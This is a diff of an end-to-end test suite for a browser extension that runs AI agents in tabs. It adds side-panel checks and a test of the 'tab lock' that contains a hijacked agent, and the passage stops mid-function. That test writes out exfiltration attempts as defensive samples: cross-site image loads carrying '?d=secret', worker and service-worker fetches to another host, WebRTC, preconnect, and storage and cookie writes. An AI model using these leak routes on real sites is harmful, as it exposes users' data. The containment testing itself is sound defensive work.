@@ -214,6 +214,17 @@ class Scenario {
   ext(fn, args = []) { return this.d.eval(this.control, fn, args); }
 
   page(fn, args = []) { return this.d.eval(this.pageCtx, fn, args); }
+
+  /**
+   * The icon TRIF's toolbar button shows for a tab, by file name ('robot-16.png', 'robot-paused-16.png'):
+   * Firefox's own record of it; in Chrome, which can't be asked, the last chrome.action.setIcon for the tab
+   * that Chrome accepted (the test build's e2e-icons.js, chrome.js), else the manifest's.
+   */
+  async toolbarIcon(tabId) {
+    const icon = this.o.browser === 'firefox' ? await this.d.actionIcon(tabId)
+      : await this.ext(`async (id) => ((await chrome.storage.session.get('e2eIcons')).e2eIcons || {})[id] || null`, [tabId]);
+    return icon ? path.basename(String(icon)) : 'robot-16.png';
+  }
   panel(fn, args = []) { return this.d.eval(this.panelCtx, fn, args); }
 
   async pageState() {
@@ -1204,6 +1215,7 @@ class Scenario {
     await this.colourChecks().catch((e) => r.check('colour checks', () => { throw e; }));
     if (!this.o.oss) await r.check('open model key: saved, then Replace (and Cancel) and Remove', () => this.openModelKey());
     await this.sweepAndScreenshotChecks(base, win);
+    if (this.o.browser === 'chrome') await this.panelWindowChecks(base, win);
     if (this.o.kind === 'upgrade') await this.mergeChecks();
     await r.check('AI Banisher and Just Results on the Google stand-ins (results and home page)', () => this.googleChecks(win));
     await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [this.xTab]).catch(() => {});
@@ -1229,6 +1241,7 @@ class Scenario {
       await r.check('Settings → New mods start → Free mods Off: a new free mod arrives off, marked "new", and doesn\'t run; a new style mod runs; switched on in the panel, it runs; Free mods On again', () => this.startsOffCheck(win));
       await r.check('mods that break: a mod that throws gets a badge and a card in the chat; Show error opens its code at the line; Ignore hides it; a new version that throws again: Fix it starts a run (a stand-in Claude Code) that fixes it, and Undo fix puts it back; a style mod whose selectors stop matching is flagged; Settings has When a mod breaks', () => this.modHealthCheck(win));
       await r.check('a hijacked agent (a stand-in Claude Code): the tab it ran code in sends nothing that changes anything until it reloads, even later; its mod that posts is held by its code, whatever its header says', () => this.hijackedAgentCheck(win));
+      await r.check('the tab lock\'s harder edges (TL-1 to TL-6): cross-site images, workers no tab owns, the site\'s other tabs, popups, WebRTC and preconnect from the locked page, and what the code leaves in the site\'s storage', () => this.tabLockHardeningCheck(win));
     }
 
     if (this.o.agent) await this.agentChecks('claude');
@@ -1375,6 +1388,155 @@ class Scenario {
     fs.writeFileSync(this.r.file('guidance.json'), JSON.stringify({ baseline: base0, rows }, null, 2));
     fs.writeFileSync(agentsFile, guides.new);
     await this.cli(['enable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
+  }
+
+  // ---- the toolbar button: Chrome's side panel, and the panel in a window where there's none (Arc)
+
+  /**
+   * Chrome: the toolbar button opens the real side panel (and no panel window), and closes it. Then with
+   * the test build's side panel made not to open, as in Arc (`e2eNoSidePanel`, lib/chrome.js): the click
+   * opens the panel in a window beside the browser window, which follows that window's tabs, closes on the
+   * next click, opens at once after that (remembered), closes with its browser window, and is closed again
+   * when a side panel shows up after all. Fresh: the click still gives activeTab for a screenshot.
+   */
+  async panelWindowChecks(base, win) {
+    const r = this.r;
+    const d = this.d;
+    const { port } = this.o.servers;
+    const PANEL = `${d.origin}/sidepanel.html`;
+    const sidePanels = async () => (await d.targets()).filter((t) => t.url === PANEL).length;
+    const panelWindows = () => this.ext(`async (url) => (await chrome.windows.getAll({ populate: true, windowTypes: ['popup'] }))
+      .filter((w) => w.tabs.length === 1 && w.tabs[0].url.startsWith(url))
+      .map((w) => ({ id: w.id, left: w.left, top: w.top, width: w.width, height: w.height, url: w.tabs[0].url.slice(url.length - 1) }))`, [`${PANEL}?`]);
+    const stored = () => this.ext(`async () => chrome.storage.local.get(['panelInWindow', 'e2eNoSidePanel'])`);
+    const newTab = (url, windowId = win.windowId) => this.ext(`async (url, windowId) => (await chrome.tabs.create({ windowId, url, active: true })).id`, [url, windowId]);
+    // Clicks TRIF's toolbar button on tab `id` (put in front in its window first).
+    const click = async (id) => {
+      const url = await this.ext(`async (id) => { const t = await chrome.tabs.update(id, { active: true }); return t.url || t.pendingUrl; }`, [id]);
+      await d.clickToolbarButton(await d.findPage((u) => u === url));
+    };
+    const tabs = [];
+    const screenshot = async (id, name) => this.cli(['screenshot', '--tab', String(id), '-o', this.r.file(`${this.label}-${String(++this.shots).padStart(2, '0')}-${name}.png`)], { json: true, timeoutMs: 30000 });
+
+    await r.check('toolbar button (Chrome): opens the side panel, no panel window, and closes it again', async () => {
+      const a = await newTab(`${base}/?e2e=side-panel`);
+      tabs.push(a);
+      if (await sidePanels()) { // (left open by an earlier check)
+        await click(a);
+        await waitFor('the side panel left open to close', async () => (await sidePanels()) === 0, { timeoutMs: 5000 });
+      }
+      const t0 = Date.now();
+      await click(a);
+      let shown = 0;
+      let sawWindow = null;
+      while (Date.now() - t0 < 2000) { // past the wait for it, looking for a panel window all the while
+        if (!shown && (await sidePanels()) === 1) shown = Date.now() - t0;
+        const w = await panelWindows();
+        if (w.length) sawWindow = w;
+        await sleep(100);
+      }
+      const st = await stored();
+      if (!shown) throw new Error('no side panel');
+      if (sawWindow || st.panelInWindow) throw new Error(`a panel window too: ${JSON.stringify(sawWindow)} ${JSON.stringify(st)}`);
+      await click(a);
+      await waitFor('the side panel to close', async () => (await sidePanels()) === 0, { timeoutMs: 5000 });
+      return `the side panel after ${shown} ms; closed again; no panel window, nothing remembered`;
+    });
+
+    let b = null;
+    let panelWin = null;
+    const opened = await r.check('no side panel (as in Arc): the click opens the panel in a window beside the browser window', async () => {
+      await this.ext(`async () => chrome.storage.local.set({ e2eNoSidePanel: true })`);
+      b = await newTab(`${base}/?e2e=panel-window`);
+      tabs.push(b);
+      await sleep(500);
+      let before = null;
+      if (!this.allSites) {
+        before = await screenshot(b, 'panel-window-refused');
+        if (before.status === 0) throw new Error('trif screenshot of the tab worked before the click');
+      }
+      const t0 = Date.now();
+      await click(b);
+      const wins = await waitFor('the panel window', async () => { const w = await panelWindows(); return w.length ? w : null; }, { timeoutMs: 6000, intervalMs: 100 });
+      const ms = Date.now() - t0;
+      if (wins.length !== 1 || wins[0].url !== `?window=${win.windowId}&fallback=1`) throw new Error(`panel windows: ${JSON.stringify(wins)}`);
+      [panelWin] = wins;
+      if (await sidePanels()) throw new Error('a side panel too');
+      if ((await stored()).panelInWindow !== true) throw new Error('not remembered (panelInWindow)');
+      const bw = await this.ext(`async (id) => { const w = await chrome.windows.get(id); return { left: w.left, top: w.top, width: w.width, height: w.height }; }`, [win.windowId]);
+      // (Headless Chrome's screen is 2560x1440: room beside the test window.)
+      const beside = bw.left + bw.width + 400 <= 2560;
+      await sleep(500); // (it may move itself beside the window once it knows its screen)
+      [panelWin] = await panelWindows();
+      const p = panelWin;
+      if (p.top !== bw.top || p.height !== bw.height || p.width !== 400
+        || (beside ? p.left !== bw.left + bw.width : p.left !== bw.left + bw.width - 400)) {
+        throw new Error(`at ${JSON.stringify(p)}, the browser window at ${JSON.stringify(bw)}`);
+      }
+      let shot = '';
+      if (!this.allSites) {
+        const x = await screenshot(b, 'panel-window-active-tab');
+        if (x.status !== 0 || !x.json || x.json.how !== 'visible') throw new Error(`trif screenshot after the click: ${x.stderr || x.stdout}`);
+        shot = '; the click gave activeTab: trif screenshot of the tab works now';
+      }
+      return `after ${ms} ms, at ${p.left},${p.top} ${p.width}x${p.height} (${beside ? 'beside' : 'over the right edge of'} the browser window at ${bw.left},${bw.top} ${bw.width}x${bw.height})${shot}`;
+    });
+    if (!opened || !panelWin) {
+      await this.ext(`async () => chrome.storage.local.remove(['e2eNoSidePanel', 'panelInWindow'])`).catch(() => {});
+      return;
+    }
+
+    await r.check('the panel window follows the browser window\'s tabs, not its own', async () => {
+      const ctx = await d.findPage((u) => u.includes('fallback=1'));
+      const site = () => d.eval(ctx, `async () => document.querySelector('#site').textContent`);
+      await waitFor('the panel window on 127.0.0.1', async () => (await site()) === '127.0.0.1', { timeoutMs: 8000 });
+      await this.shot(ctx, 'panel-window');
+      const c = await newTab(`http://localhost:${port}/?e2e=panel-window`);
+      tabs.push(c);
+      await waitFor('the panel window to follow to localhost', async () => (await site()) === 'localhost', { timeoutMs: 8000 });
+      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [b]);
+      await waitFor('the panel window to follow back', async () => (await site()) === '127.0.0.1', { timeoutMs: 8000 });
+      return '127.0.0.1, localhost, 127.0.0.1';
+    });
+
+    await r.check('the next click closes the panel window; the one after opens it at once (remembered)', async () => {
+      await click(b);
+      await waitFor('the panel window to close', async () => (await panelWindows()).length === 0, { timeoutMs: 5000, intervalMs: 100 });
+      const t0 = Date.now();
+      await click(b);
+      await waitFor('the panel window', async () => (await panelWindows()).length === 1, { timeoutMs: 5000, intervalMs: 50 });
+      const ms = Date.now() - t0;
+      if (ms >= 1000) throw new Error(`took ${ms} ms: it waited for the side panel again`);
+      return `closed; opened again after ${ms} ms`;
+    });
+
+    await r.check('closing a browser window closes its panel window (and only its)', async () => {
+      const w2 = await this.ext(`async (url) => { const w = await chrome.windows.create({ url, width: 900, height: 700, focused: true }); return { windowId: w.id, tabId: w.tabs[0].id }; }`, [`${base}/?e2e=window-two`]);
+      await sleep(500);
+      await click(w2.tabId);
+      await waitFor('its panel window', async () => (await panelWindows()).some((w) => w.url === `?window=${w2.windowId}&fallback=1`), { timeoutMs: 5000, intervalMs: 100 });
+      await this.ext(`async (id) => { await chrome.windows.remove(id); }`, [w2.windowId]);
+      const left = await waitFor('its panel window to close', async () => { const w = await panelWindows(); return w.some((x) => x.url.includes(`window=${w2.windowId}&`)) ? null : w; }, { timeoutMs: 5000, intervalMs: 100 });
+      if (left.length !== 1 || left[0].url !== `?window=${win.windowId}&fallback=1`) throw new Error(`panel windows left: ${JSON.stringify(left)}`);
+      if (!(await d.contexts()).some((c) => c.url === `${PANEL}?window=${win.windowId}`)) throw new Error('the suite\'s own panel window went too');
+      await click(b);
+      await waitFor('the test window\'s panel window to close', async () => (await panelWindows()).length === 0, { timeoutMs: 5000, intervalMs: 100 });
+      return 'closed with its window; the test window\'s stayed until its click';
+    });
+
+    await r.check('a side panel that shows up after all closes the panel window, and the browser is forgotten', async () => {
+      await this.ext(`async () => chrome.storage.local.remove('e2eNoSidePanel')`);
+      await sleep(300);
+      await click(b);
+      await waitFor('the side panel, and no panel window', async () => (await sidePanels()) === 1 && (await panelWindows()).length === 0 && (await stored()).panelInWindow === undefined, { timeoutMs: 8000 });
+      await click(b);
+      await waitFor('the side panel to close', async () => (await sidePanels()) === 0, { timeoutMs: 5000 });
+      return 'side panel shown, panel window closed, panelInWindow gone';
+    });
+
+    await this.ext(`async () => chrome.storage.local.remove(['e2eNoSidePanel', 'panelInWindow'])`).catch(() => {});
+    for (const id of tabs) await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [id]).catch(() => {});
+    await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]).catch(() => {});
   }
 
   // ---- trif sweep on a page of repeated things, and screenshots of a tab that isn't showing
@@ -2513,7 +2675,7 @@ process.exitCode = 1;
     const base = `http://${site}:${this.o.servers.port}`;
     const setStore = (v) => this.ext(`async (v) => { await chrome.storage.local.set(v); }`, [v]);
     const panelState = () => this.panel(`async () => ({ level: document.getElementById('agent-level').value, shown: !document.getElementById('agent-level').hidden,
-      note: document.getElementById('agent-note').hidden ? '' : document.getElementById('agent-note').textContent,
+      note: document.getElementById('agent-site-note').hidden ? '' : document.getElementById('agent-site-note').textContent,
       ask: document.getElementById('agent-ask')?.open ? document.getElementById('agent-ask-title').textContent : null })`);
     const themes = async (name) => { for (const scheme of ['dark', 'light']) if (await this.d.colorScheme(this.panelCtx, scheme)) { await sleep(150); await this.shot(this.panelCtx, `${name}-${scheme}`); } await this.d.colorScheme(this.panelCtx, ''); };
     const problems = [];
@@ -2797,7 +2959,7 @@ page.root.setAttr('data-trif-box-spec', r);\n`,
           starts: [...document.querySelectorAll('.starts-row')].map((l) => l.querySelector('span').textContent + '=' + l.querySelector('select').value) } : null;
       }`), { timeoutMs: 15000 });
       const order = layout.heads.join(',');
-      if (!/^(rules,)?sandboxed(,page)?$/.test(order) || layout.name !== 'Boxed mods' || layout.note !== 'Run in TRIF\'s sandbox: they change what the page shows, and can\'t send, load or click anything themselves.' || layout.rowGroup !== 'sandboxed') throw new Error(`the panel: ${JSON.stringify(layout)}`);
+      if (!/^(rules,)?sandboxed(,page)?$/.test(order) || layout.name !== 'Boxed mods' || layout.note !== 'Run in TRIF\'s sandbox: they change what the page shows, and do only what you\'ve allowed.' || layout.rowGroup !== 'sandboxed') throw new Error(`the panel: ${JSON.stringify(layout)}`);
       if (layout.order.indexOf('127.0.0.1/e2e-sbx-panel') < layout.order.indexOf('sandboxed') || (layout.order.includes('page') && layout.order.indexOf('127.0.0.1/e2e-sbx-panel') > layout.order.indexOf('page'))) throw new Error(`not under its heading: ${JSON.stringify(layout.order)}`);
       if (JSON.stringify(layout.starts) !== JSON.stringify(['Style mods=on', 'Boxed mods=on', 'Free mods=on'])) throw new Error(`New mods start: ${JSON.stringify(layout.starts)}`);
       await this.shot(this.panelCtx, 'panel-sandboxed-group');
@@ -3123,8 +3285,36 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
       if (this.o.servers.requests.some((q) => q.url.startsWith('/e2e-socket'))) throw new Error('the WebSocket reached the test site');
       // The panel says so, with a Reload button
-      const lock = await waitFor('the lock notice', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden ? n.innerText : null; }`), { timeoutMs: 10000 });
-      if (!/Posting is paused on this tab/.test(lock)) throw new Error(`the lock notice: ${lock}`);
+      // (one line and a small Reload button, the details in the line's tooltip; the robot in the bar paused,
+      // the panel's state colour the paused one unless red or yellow applies)
+      const lock = await waitFor('the lock notice', () => this.panel(`async () => {
+        const n = document.getElementById('tab-lock');
+        if (!n || n.hidden) return null;
+        const pause = getComputedStyle(document.querySelector('#bar-robot .pause')).display !== 'none';
+        const eyes = getComputedStyle(document.querySelector('#bar-robot .eye')).display !== 'none';
+        // The state colour: red or yellow if one applies (they win), else the paused white (dark grey on
+        // light); and with those taken away for a moment, the paused colour, the bars white
+        const b = document.body.classList;
+        const colour = (v) => { const s = document.createElement('span'); s.style.color = v; document.body.append(s); const c = getComputedStyle(s).color; s.remove(); return c; };
+        const fills = () => ({ rim: getComputedStyle(document.querySelector('#bar-robot .rim')).fill, bars: getComputedStyle(document.querySelector('#bar-robot .pause')).fill });
+        const state = { ...fills(), want: colour(b.contains('blocked') ? 'var(--bad)' : b.contains('needs-login') ? 'var(--warn)' : 'var(--paused)') };
+        const had = ['blocked', 'needs-login'].filter((c) => b.contains(c));
+        b.remove(...had);
+        const paused = { ...fills(), want: colour('var(--paused)'), white: colour('#fff') };
+        b.add(...had);
+        return { text: n.innerText.trim(), tip: n.querySelector('.title')?.title || '', button: n.querySelector('button')?.textContent || '', height: n.getBoundingClientRect().height, pause, eyes, state, paused, had };
+      }`), { timeoutMs: 10000 });
+      if (lock.state.rim !== lock.state.want) throw new Error(`the robot's rim on the paused tab (${lock.had.join(', ') || 'nothing else'} in the way): ${JSON.stringify(lock.state)}`);
+      if (lock.paused.rim !== lock.paused.want || lock.paused.bars !== lock.paused.white) throw new Error(`the paused colours: ${JSON.stringify(lock.paused)}`);
+      if (!/^Posting is paused: your agent ran code here\.\s*Reload$/.test(lock.text) || lock.button !== 'Reload') throw new Error(`the lock notice: ${JSON.stringify(lock)}`);
+      if (!/blocked anything here from posting, sending or saving as you/.test(lock.tip)) throw new Error(`the lock notice's tooltip: ${lock.tip}`);
+      if (lock.height > 48) throw new Error(`the lock notice is ${lock.height} px tall: one line expected`);
+      if (!lock.pause || lock.eyes) throw new Error(`the robot in the bar: ${JSON.stringify(lock)}`);
+      // TRIF's toolbar icon for that tab: the paused robot; other tabs keep the normal one
+      await waitFor('the paused toolbar icon', async () => (await this.toolbarIcon(win.tabId)) === 'robot-paused-16.png' || null, { timeoutMs: 10000 })
+        .catch(async (e) => { throw new Error(`${e.message}: ${await this.toolbarIcon(win.tabId)}`); });
+      const otherTab = await this.ext(`async (id) => (await chrome.tabs.query({})).map((t) => t.id).find((t) => t !== id) ?? null`, [win.tabId]);
+      if (otherTab != null && (await this.toolbarIcon(otherTab)) !== 'robot-16.png') throw new Error(`tab ${otherTab}'s toolbar icon: ${await this.toolbarIcon(otherTab)}`);
       // The mod: held for what its code does, its header's claim shown apart
       const card = await this.approvalFor(`${site}/e2e-poster`);
       const held = { facts: card.items, claim: card.claim };
@@ -3142,12 +3332,18 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       await sleep(2500);
       if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
       await waitFor('the lock notice still up', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden || null; }`), { timeoutMs: 10000 });
+      // (still paused on the blocked page: Firefox drops a tab's own icon on a new page, and TRIF sets it again)
+      await waitFor('the toolbar icon still paused', async () => (await this.toolbarIcon(win.tabId)) === 'robot-paused-16.png' || null, { timeoutMs: 10000 })
+        .catch(async (e) => { throw new Error(`${e.message}: ${await this.toolbarIcon(win.tabId)}`); });
       await this.panel(`async () => { document.querySelector('#tab-lock button').click(); return true; }`);
       await waitFor('the tab back on the test site', async () => {
         const t = await this.ext(`async (id) => (await chrome.tabs.get(id)).url`, [win.tabId]);
         return t && t.startsWith(base) ? t : null;
       }, { timeoutMs: 15000 });
       await waitFor('the tab unlocked', () => this.panel(`async () => document.getElementById('tab-lock').hidden || null`), { timeoutMs: 15000 });
+      await waitFor('the normal toolbar icon back', async () => (await this.toolbarIcon(win.tabId)) === 'robot-16.png' || null, { timeoutMs: 10000 })
+        .catch(async (e) => { throw new Error(`${e.message}: ${await this.toolbarIcon(win.tabId)}`); });
+      if (!(await this.panel(`async () => !document.body.classList.contains('tab-locked')`))) throw new Error('the robot in the bar is still paused');
       const t = await this.cli(['run', '--tab', String(win.tabId), 'fetch("/e2e-after", { method: "POST", body: "x" }).then((r) => r.status)'], { timeoutMs: 30000 });
       if (t.status !== 0) throw new Error(`trif run from a terminal: ${t.stderr}`);
       await waitFor('the terminal POST to arrive', () => posted('/e2e-after').length || null, { timeoutMs: 5000 });
@@ -3176,6 +3372,271 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
     } finally {
       fs.writeFileSync(cfgFile, saved);
       for (const f of [modFile, path.join(this.trif, 'sites', site, 'e2e-pasted.js')]) { try { fs.unlinkSync(f); } catch { /* not written */ } }
+      await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
+      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
+    }
+  }
+
+  // ---- the tab lock's harder edges (docs/TABLOCK-AUDIT.md TL-1 to TL-6, extension/tablock.js)
+
+  /**
+   * Locks a tab with a stand-in side-panel agent (one `trif run`, which also puts in the page's leak
+   * guard), then tries what the audit suspected from the locked page, with terminal `trif run`s (the
+   * user's own: they don't lock, but the lock's rules apply to them) and page code with user activation
+   * (for popups): a cross-site image (TL-1), a SharedWorker from a blob: URL and a service worker sending
+   * for the page (TL-2), another tab of the site posting (TL-4), popups to another site (TL-5), WebRTC and
+   * preconnect (TL-6), and the site's storage (TL-3: the agent's own saves refused, the page's own work;
+   * a cache and service worker left by a terminal run are cleared at unlock; a localStorage change gets a
+   * note in the chat). Each item is "open" if anything got through. Everything is tried, then the open
+   * ones fail the check together.
+   */
+  async tabLockHardeningCheck(win) {
+    const dir = path.join(this.work, 'standin-harden');
+    fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(path.join(dir, 'claude'), `#!${process.execPath}
+const { spawnSync } = require('child_process');
+const fs = require('fs');
+const a = process.argv.slice(2);
+if (a[0] === '--version') { console.log('2.1.319 (Claude Code)'); process.exit(0); }
+if (a[0] === 'auth') { console.log('{"loggedIn": true, "authMethod": "claude.ai"}'); process.exit(0); }
+const say = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
+say({ type: 'system', subtype: 'init', session_id: 'e2e-harden' });
+const ctxFile = a[a.indexOf('--append-system-prompt-file') + 1];
+const ctx = a.includes('--append-system-prompt-file') ? fs.readFileSync(ctxFile, 'utf8') : a.join(' ');
+const tab = (/\\(tab (\\d+)\\)/.exec(ctx) || [])[1];
+const own = require('path').join(process.cwd(), 'bin', 'trif');
+const run = (code) => {
+  const r = spawnSync(fs.existsSync(own) ? own : 'trif', ['run', '--tab', tab, '--timeout', '8000', code], { encoding: 'utf8' });
+  return r.status === 0 ? r.stdout.trim() : 'trif failed: ' + String(r.stderr || r.stdout).trim();
+};
+const out = { tab, ran: run('"locked"'), saves: {} };
+// (TL-3: the agent's own saves, refused by the page's save guard)
+if (fs.existsSync(__dirname + '/saves.json')) for (const [k, code] of Object.entries(JSON.parse(fs.readFileSync(__dirname + '/saves.json', 'utf8')))) out.saves[k] = run(code);
+const text = JSON.stringify(out);
+say({ type: 'assistant', message: { model: 'claude-e2e', content: [{ type: 'text', text }] } });
+say({ type: 'result', subtype: 'success', is_error: false, result: text, session_id: 'e2e-harden' });
+`, { mode: 0o755 });
+    const cfgFile = path.join(this.priv, 'config.json');
+    const saved = fs.readFileSync(cfgFile, 'utf8');
+    const cfg = JSON.parse(saved);
+    cfg.env = { ...(cfg.env || {}), PATH: [dir, cfg.env?.PATH].filter(Boolean).join(':') };
+    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
+    const site = '127.0.0.1';
+    const { port, tlsPort } = this.o.servers;
+    const base = `http://${site}:${port}`;
+    const other = `http://localhost:${port}`;
+    const cdn = `https://www.google.com:${tlsPort}`;
+    const reqs = (host, p) => this.o.servers.requests.filter((q) => q.host === host && q.url.startsWith(p));
+    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [`chat:${site}`]);
+    const reopen = async () => {
+      await this.panel(`async () => { setTimeout(() => location.reload(), 20); return true; }`).catch(() => {});
+      await sleep(800);
+      this.panelCtx = await this.d.findPage('sidepanel.html');
+    };
+    const run = async (tab, code) => {
+      const x = await this.cli(['run', '--tab', String(tab), '--timeout', '9000', code], { timeoutMs: 30000 });
+      return x.status === 0 ? x.stdout.trim() : `error: ${String(x.stderr || x.stdout).trim().slice(0, 200)}`;
+    };
+    // The panel shows the active tab's notice: the locked tab in front, then its button
+    const press = async (label) => {
+      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]);
+      await waitFor(`the notice's ${label} button`, () => this.panel(`async (re) => [...document.querySelectorAll('#tab-lock button')].some((b) => new RegExp(re).test(b.textContent)) || null`, [label]), { timeoutMs: 10000 });
+      await this.panel(`async (re) => { [...document.querySelectorAll('#tab-lock button')].find((b) => new RegExp(re).test(b.textContent)).click(); return true; }`, [label]);
+    };
+    const lockNotice = () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden ? { text: n.innerText.trim(), buttons: [...n.querySelectorAll('button')].map((b) => b.textContent) } : null; }`);
+    const lockByAgent = async (what) => {
+      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]);
+      await reopen();
+      await this.waitPanel(`the panel on ${site}`, (x) => x.site === site && !x.gate, 15000);
+      await this.waitLooks('Send on (the stand-in Claude Code)', (l) => /Claude Code/.test(l.dotLabel) && !l.send.disabled, 30000);
+      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [what]);
+      await this.d.click(this.panelCtx, '#send');
+      const c = await waitFor('the stand-in run to finish', async () => { const x = await chat(); return x && !x.run && x.messages.length >= 2 ? x : null; }, { timeoutMs: 60000, intervalMs: 300 });
+      const said = JSON.parse(c.messages.find((m) => m.role === 'assistant')?.text || '{}');
+      if (said.ran !== 'locked') throw new Error(`the stand-in's run: ${JSON.stringify(said)}`);
+      await waitFor('the lock notice', lockNotice, { timeoutMs: 10000 });
+      return said;
+    };
+    // TL-3: what the stand-in agent tries to save (each must be refused)
+    fs.writeFileSync(path.join(dir, 'saves.json'), JSON.stringify({
+      localStorage: 'localStorage.setItem("e2e-agent", "1")',
+      named: 'localStorage.e2eAgent = "1"',
+      sessionStorage: 'sessionStorage.setItem("e2e-agent", "1")',
+      cookie: 'document.cookie = "e2eagent=1"',
+      indexedDB: 'new Promise((res, rej) => { const q = indexedDB.open("e2e-agent"); q.onsuccess = () => res("opened"); q.onerror = () => rej(q.error); })',
+      caches: 'caches.open("e2e-agent").then(() => "opened")',
+      serviceWorker: 'navigator.serviceWorker.register("/e2e-sw.js?agent").then(() => "registered")',
+      later: '(async () => { await new Promise((r) => setTimeout(r, 10)); localStorage.setItem("e2e-agent-later", "1"); return "saved"; })()',
+      frame: '(() => { const f = document.createElement("iframe"); document.body.append(f); f.contentWindow.localStorage.setItem("e2e-agent-frame", "1"); return "saved"; })()',
+    }));
+    // Listeners for what isn't HTTP: STUN (UDP) and preconnect (a bare TCP connection), one port each
+    const dgram = require('dgram');
+    const net = require('net');
+    const udp = dgram.createSocket('udp4');
+    let stun = 0;
+    udp.on('message', () => { stun++; });
+    await new Promise((res) => udp.bind(0, '127.0.0.1', res));
+    const tcp = {};
+    const listen = (name) => new Promise((res) => {
+      const s = net.createServer((c) => { s.hits++; c.destroy(); });
+      s.hits = 0;
+      s.listen(0, '127.0.0.1', () => { tcp[name] = s; res(); });
+    });
+    for (const n of ['setter', 'attribute', 'html']) await listen(n);
+    const found = {}; // item -> [what got through]
+    const open = (id, what) => { (found[id] ||= []).push(what); };
+    const notes = [];
+    const extra = [];
+    this.hijacked = true;
+    this.hardened = true;
+    try {
+      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/?e2e=harden`]);
+      await waitFor('the page', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [win.tabId])) === 'complete' || null, { timeoutMs: 15000 });
+      // Before the lock: the page loads an image from a "CDN" (TL-1: it may go on doing so)
+      await run(win.tabId, `new Promise((r) => { const i = new Image(); i.onload = i.onerror = () => r("loaded"); i.src = "${cdn}/e2e-cdn-1.png"; })`);
+      // Another tab of the site, open before the lock (TL-4)
+      const sib = await this.ext(`async (url) => (await chrome.tabs.create({ url, active: false })).id`, [`${base}/two.html?e2e=sibling`]);
+      await waitFor('the other tab', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [sib])) === 'complete' || null, { timeoutMs: 15000 });
+      // ---- lock 1
+      const said = await lockByAgent('tidy the page');
+      const t0 = Date.now();
+      // TL-3: the agent's saves refused, with TRIF's words for why; the page's own saves work
+      const saved = Object.entries(said.saves || {}).filter(([, v]) => !/TRIF: your agent's code can't save data on this site/.test(v));
+      for (const [k, v] of saved) open('TL-3', `the agent's code saved (${k}): ${v}`);
+      if (!Object.keys(said.saves || {}).length) open('TL-3', 'the stand-in tried no saves');
+      const agentLeft = await run(win.tabId, '(async () => [localStorage.getItem("e2e-agent"), localStorage.getItem("e2e-agent-later"), localStorage.getItem("e2eAgent"), document.cookie.includes("e2eagent"), (await caches.keys()).includes("e2e-agent")].filter(Boolean).length)()');
+      if (agentLeft !== '0') open('TL-3', `what the agent's code tried to save is there: ${agentLeft}`);
+      const pageCtx = await this.d.findPage((u) => u.includes('e2e=harden'), { timeoutMs: 5000 });
+      const own = await this.d.eval(pageCtx, 'async () => { localStorage.setItem("e2e-own", "1"); localStorage.e2eOwnNamed = "1"; document.cookie = "e2eown=1"; return [localStorage.getItem("e2e-own"), localStorage.getItem("e2eOwnNamed"), document.cookie.includes("e2eown")].join(","); }');
+      if (own !== '1,1,true') open('TL-3', `the page's own saves: ${own}`);
+      notes.push(`agent's saves: ${JSON.stringify(said.saves)}`, `page's own saves: ${own}`);
+      // TL-1: an image to another site; the CDN it already used still loads
+      await run(win.tabId, `new Promise((r) => { const i = new Image(); i.onload = i.onerror = () => r(1); i.src = "${other}/e2e-img-leak?d=secret"; })`);
+      await run(win.tabId, `new Promise((r) => { const i = new Image(); i.onload = i.onerror = () => r(1); i.src = "${cdn}/e2e-cdn-2.png"; })`);
+      // TL-2: a SharedWorker from a blob: URL, and the site's own service worker, sending for the page
+      const shared = await run(win.tabId, `new Promise((res) => {
+        const src = 'onconnect = (e) => { const p = e.ports[0]; p.onmessage = (m) => fetch(m.data.url, { method: m.data.method, body: m.data.method === "POST" ? "x" : undefined }).then((r) => p.postMessage("sent " + r.status), (x) => p.postMessage("blocked: " + x.message)); };';
+        const w = new SharedWorker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })));
+        const out = [];
+        w.port.onmessage = (m) => { out.push(m.data); if (out.length === 2) res(out.join(" / ")); };
+        w.port.postMessage({ url: "${base}/e2e-shw-post", method: "POST" }); // (absolute: a blob: worker has no base)
+        w.port.postMessage({ url: "${other}/e2e-shw-leak?d=secret", method: "GET" });
+        setTimeout(() => res(out.join(" / ") || "no answer"), 5000);
+      })`);
+      const worker = await run(win.tabId, `(async () => {
+        const reg = await navigator.serviceWorker.register("/e2e-sw.js");
+        await navigator.serviceWorker.ready;
+        const ask = (m) => new Promise((res) => { const ch = new MessageChannel(); ch.port1.onmessage = (e) => res(e.data); reg.active.postMessage(m, [ch.port2]); setTimeout(() => res("no answer"), 4000); });
+        return [await ask({ url: "/e2e-sw-post", method: "POST" }), await ask({ url: "${other}/e2e-sw-leak?d=secret", method: "GET" })].join(" / ");
+      })()`);
+      // TL-3 (the service worker above, and a cache entry): what the code leaves in the site's storage
